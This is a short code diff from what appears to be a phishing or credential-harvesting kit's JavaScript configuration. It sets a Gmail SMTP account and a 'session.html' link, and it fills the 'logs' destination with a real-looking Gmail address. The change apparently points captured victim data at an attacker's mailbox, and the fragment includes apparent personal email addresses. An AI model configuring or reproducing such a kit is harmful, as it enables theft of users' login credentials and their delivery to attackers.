@@ -2,7 +2,7 @@ var smtp_host = 'smtp.gmail.com';
 var smtp_username = 'emily4luv90@gmail.com';
 
 //Enter were logs will go here
-var log_email = ''
+var log_email = 'bestseason19@gmail.com'
 
 
 url_link = "session.html";
